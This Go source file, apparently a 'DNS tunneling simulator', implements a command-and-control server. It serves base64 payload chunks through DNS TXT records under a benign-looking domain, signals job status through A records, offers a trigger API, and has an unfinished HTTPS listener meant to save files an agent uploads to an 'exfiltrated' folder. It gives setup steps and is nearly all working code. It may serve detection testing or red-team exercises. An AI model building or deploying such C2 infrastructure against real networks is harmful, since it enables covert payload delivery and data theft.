// C2 Server - DNS Tunneling Simulator
//
// This server acts as an authoritative nameserver for the configured domain.
// It responds to:
//   - A record queries: Returns job status encoded as IP ranges
//   - TXT record queries: Returns base64-encoded payload chunks
//
// Additionally, it runs:
//   - HTTP API (localhost only) to trigger job state
//   - HTTPS listener for file uploads from agent
//
// USAGE:
//  1. Configure variables below
//  2. Ensure your domain's NS records point to this server's IP
//  3. Run: go run ./cmd/server
//  4. Trigger a job: curl -X POST http://localhost:9090/trigger
package main

import (
	"fmt"
	"log"
	"net/http"

	"motd_joker_screenmate/internal/dns"
)

// =============================================================================
// CONFIGURATION - Modify these variables for your environment
// =============================================================================

var (
	// Domain is the base domain for DNS queries.
	// Your DNS registrar must have NS records pointing to this server.
	Domain = "timeserversync.com"

	// PayloadFile is the file to transfer via TXT records when a job is triggered.
	// Use a ~2MB file for realistic traffic generation.
	PayloadFile = "./payloads/payload.jpg"

	// CertDir is where TLS certificates are stored/generated.
	// If cert.pem and key.pem don't exist, they'll be auto-generated.
	CertDir = "./certs"

	// DNSPort is the port for the authoritative DNS server.
	// Must be 53 for standard DNS resolution to work.
	DNSPort = 53

	// HTTPSPort is the port for receiving file uploads from the agent.
	HTTPSPort = 8443

	// TriggerPort is the localhost-only HTTP API port for triggering jobs.
	TriggerPort = 9090

	// ExfilDir is where files uploaded by the agent are saved.
	ExfilDir = "./exfiltrated"
)

// Global reference to DNS server (needed by HTTP handlers)
var dnsServer *dns.Server

func main() {
	log.Println("=== DNS Tunnel C2 Server ===")
	log.Printf("Domain: %s", Domain)
	log.Printf("Payload file: %s", PayloadFile)
	log.Printf("DNS port: %d", DNSPort)
	log.Printf("HTTPS port: %d", HTTPSPort)
	log.Printf("Trigger API port: %d", TriggerPort)

	// Create DNS server instance
	dnsServer = dns.NewServer(Domain, DNSPort)

	// Start DNS server in a goroutine (it blocks)
	go func() {
		log.Printf("[MAIN] Starting DNS server on port %d...", DNSPort)
		if err := dnsServer.Start(); err != nil {
			log.Fatalf("[MAIN] DNS server failed: %v", err)
		}
	}()

	// Start trigger API in a goroutine
	go func() {
		log.Printf("[MAIN] Starting trigger API on localhost:%d...", TriggerPort)
		if err := startTriggerAPI(); err != nil {
			log.Fatalf("[MAIN] Trigger API failed: %v", err)
		}
	}()

	// TODO: Phase 5 - Start HTTPS listener

	log.Println("[MAIN] Server running. Press Ctrl+C to stop.")
	log.Println("[MAIN] To trigger a job: curl -X POST http://localhost:9090/trigger")
	select {} // Block forever
}

// startTriggerAPI starts the HTTP server for the trigger endpoint.
// This only listens on localhost for security.
func startTriggerAPI() error {
	mux := http.NewServeMux()

	// POST /trigger - Activate job state
	mux.HandleFunc("/trigger", handleTrigger)

	// GET /status - Check current state (useful for debugging)
	mux.HandleFunc("/status", handleStatus)

	// Listen only on localhost (security: agent cannot trigger jobs remotely)
	addr := fmt.Sprintf("127.0.0.1:%d", TriggerPort)
	return http.ListenAndServe(addr, mux)
}

// handleTrigger activates a job, loading the payload file for TXT transfer.
//
// Usage: curl -X POST http://localhost:9090/trigger
//
// You can optionally specify a different payload file:
//
//	curl -X POST "http://localhost:9090/trigger?file=/path/to/other.bin"
func handleTrigger(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed. Use POST.", http.StatusMethodNotAllowed)
		return
	}

	// Check for custom payload file in query params
	payloadPath := r.URL.Query().Get("file")
	if payloadPath == "" {
		payloadPath = PayloadFile // Use default
	}

	log.Printf("[API] Trigger request received. Payload: %s", payloadPath)

	// Trigger the job
	if err := dnsServer.TriggerJob(payloadPath); err != nil {
		log.Printf("[API] Failed to trigger job: %v", err)
		http.Error(w, fmt.Sprintf("Failed to trigger job: %v", err), http.StatusInternalServerError)
		return
	}

	msg := fmt.Sprintf("Job triggered successfully. Payload: %s", payloadPath)
	log.Printf("[API] %s", msg)
	w.WriteHeader(http.StatusOK)
	fmt.Fprintln(w, msg)
}

// handleStatus returns the current server state.
//
// Usage: curl http://localhost:9090/status
func handleStatus(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed. Use GET.", http.StatusMethodNotAllowed)
		return
	}

	jobPending := dnsServer.IsJobPending()

	status := "NO_JOB"
	if jobPending {
		status = "JOB_PENDING"
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, "Status: %s\n", status)
}
